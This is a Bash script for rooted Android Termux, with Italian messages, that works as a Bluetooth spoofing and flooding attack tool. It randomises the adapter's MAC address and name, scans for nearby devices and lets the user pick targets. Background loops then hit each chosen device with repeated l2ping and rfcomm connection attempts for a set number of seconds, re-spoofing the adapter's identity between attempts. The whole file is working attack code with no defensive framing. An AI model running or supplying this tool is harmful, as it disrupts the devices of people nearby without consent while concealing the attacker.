#!/data/data/com.termux/files/usr/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

print_colored() {
    local text="$1"
    local color="$2"
    echo -e "${color}${text}${NC}"
}

command_exists() {
    command -v "$1" >/dev/null 2>&1
}

install_pkg() {
    local pkg_name="$1"
    print_colored "[*] Il comando '$pkg_name' non è stato trovato. Tentativo di installazione tramite pkg..." "${YELLOW}"
    if pkg install -y "$pkg_name"; then
        print_colored "[+] '$pkg_name' installato con successo." "${GREEN}"
        return 0
    else
        print_colored "[!] Errore durante l'installazione di '$pkg_name'." "${RED}"
        exit 1
    fi
}

preliminary_checks() {
    print_colored "[*] Avvio dello script di spoofing e flood Bluetooth per Termux." "${YELLOW}"
    if [[ "$(id -u)" -ne 0 ]]; then
        print_colored "[!] Devi eseguire questo script come root." "${RED}"
        exit 1
    fi
    print_colored "[*] Controllo delle dipendenze Bluetooth..." "${YELLOW}"
    local required_bt_cmds=("hciconfig" "bdaddr" "hcitool" "l2ping" "rfcomm")
    local bluez_installed=false
    for cmd in "${required_bt_cmds[@]}"; do
        if ! command_exists "$cmd"; then
            if [ "$bluez_installed" = false ]; then
                install_pkg "bluez" || exit 1
                bluez_installed=true
            fi
            if ! command_exists "$cmd"; then
                print_colored "[!] Impossibile trovare '$cmd'." "${RED}"
                exit 1
            fi
        fi
    done
    if ! command_exists "timeout"; then
        install_pkg "coreutils" || exit 1
    fi
}

spoof_identity() {
    local rand_mac="02:$(hexdump -n3 -e '/1 ":%02X"' /dev/urandom)"
    local rand_name="BT_$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 6 | head -n1)"
    print_colored "[*] Spoofing identità..." "${YELLOW}"
    hciconfig hci0 down &>/dev/null || { print_colored "[!] Errore: hci0 down." "${RED}"; return 1; }
    bdaddr -i hci0 "$rand_mac" &>/dev/null || { print_colored "[!] Errore: MAC spoof failed." "${RED}"; return 1; }
    hciconfig hci0 name "$rand_name" &>/dev/null || { print_colored "[!] Errore: name spoof failed." "${RED}"; return 1; }
    hciconfig hci0 up &>/dev/null || { print_colored "[!] Errore: hci0 up." "${RED}"; return 1; }
    print_colored "[+] Spoof riuscito: ${rand_name} - ${rand_mac}" "${GREEN}"
    return 0
}

scan_devices() {
    print_colored "[*] Scansione dispositivi (10s)..." "${YELLOW}"
    timeout 10s hcitool scan > /tmp/bluetooth_scan_results.txt 2>&1
    [[ ! -s /tmp/bluetooth_scan_results.txt ]] && { print_colored "[!] Nessun dispositivo trovato." "${RED}"; rm -f /tmp/bluetooth_scan_results.txt; return 1; }
    devices=()
    while IFS= read -r line; do
        line=$(echo "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
        [[ -n "$line" && "$line" != *"Scanning"* ]] && {
            local mac=$(echo "$line" | awk '{print $1}')
            local name=$(echo "$line" | cut -d ' ' -f 2-)
            name="${name:-[NOME SCONOSCIUTO]}"
            [[ -n "$mac" ]] && devices+=("$mac|$name")
        }
    done < <(tail -n +2 /tmp/bluetooth_scan_results.txt)
    rm -f /tmp/bluetooth_scan_results.txt
    [[ ${#devices[@]} -eq 0 ]] && { print_colored "[!] Nessun dispositivo valido trovato." "${RED}"; return 1; }
    print_colored "--- Dispositivi Trovati ---" "${YELLOW}"
    for i in "${!devices[@]}"; do
        IFS="|" read -r mac name <<< "${devices[$i]}"
        print_colored "[$i] ${name} - ${mac}" "${NC}"
    done
    print_colored "---------------------------" "${YELLOW}"
    return 0
}

flood_loop() {
    local target_mac="$1"
    local target_name="$2"
    local duration_seconds="$3"
    local end_time=$(( SECONDS + duration_seconds ))
    print_colored "[*] Flood su ${target_name} (${target_mac}) per ${duration_seconds}s..." "${YELLOW}"
    while [ "$SECONDS" -lt "$end_time" ]; do
        spoof_identity &>/dev/null || print_colored "[!] Spoof fallito temporaneamente." "${RED}"
        if l2ping -c 1 "$target_mac" &>/dev/null; then
            print_colored "[L2PING] OK: ${target_name} (${target_mac})" "${GREEN}"
        else
            print_colored "[L2PING] Fallito: ${target_name} (${target_mac})" "${RED}"
        fi
        if timeout 2s rfcomm connect hci0 "$target_mac" 1 &>/dev/null; then
            print_colored "[RFCOMM] Connesso: ${target_name} (${target_mac})" "${GREEN}"
        else
            print_colored "[RFCOMM] Fallito: ${target_name} (${target_mac})" "${RED}"
        fi
        sleep 0.5
    done
    print_colored "[*] Flood terminato: ${target_name} (${target_mac})" "${GREEN}"
}

preliminary_checks

if ! scan_devices; then
    print_colored "[!] Nessun dispositivo trovato. Esco." "${RED}"
    exit 1
fi

read -p "$(print_colored "Inserisci index separati da spazio dei target (es: 0 2 3): " "${YELLOW}")" -a selected_indices

valid_selection=true
for index in "${selected_indices[@]}"; do
    if ! [[ "$index" =~ ^[0-9]+$ ]] || [[ "$index" -ge ${#devices[@]} ]]; then
        print_colored "[!] Index non valido: $index" "${RED}"
        valid_selection=false
        break
    fi
done
! "$valid_selection" && exit 1

read -p "$(print_colored "Digita il comando /flood <secondi> (es: /flood 60): " "${YELLOW}")" cmd_input

if [[ "$cmd_input" =~ ^/flood[[:space:]]+([0-9]+)$ ]]; then
    duration="${BASH_REMATCH[1]}"
    [[ "$duration" -le 0 ]] && { print_colored "[!] Durata non valida." "${RED}"; exit 1; }
else
    print_colored "[!] Comando non valido." "${RED}"
    exit 1
fi

print_colored "[*] Avvio dei flood in background..." "${YELLOW}"
for i in "${selected_indices[@]}"; do
    IFS="|" read -r mac name <<< "${devices[$i]}"
    print_colored "[*] Target: ${name} (${mac})" "${YELLOW}"
    ( flood_loop "$mac" "$name" "$duration" ) &
done

print_colored "[*] In attesa che tutti i flood terminino..." "${YELLOW}"
wait
print_colored "[*] Tutti i flood completati." "${GREEN}"
print_colored "[*] Script completato." "${GREEN}"
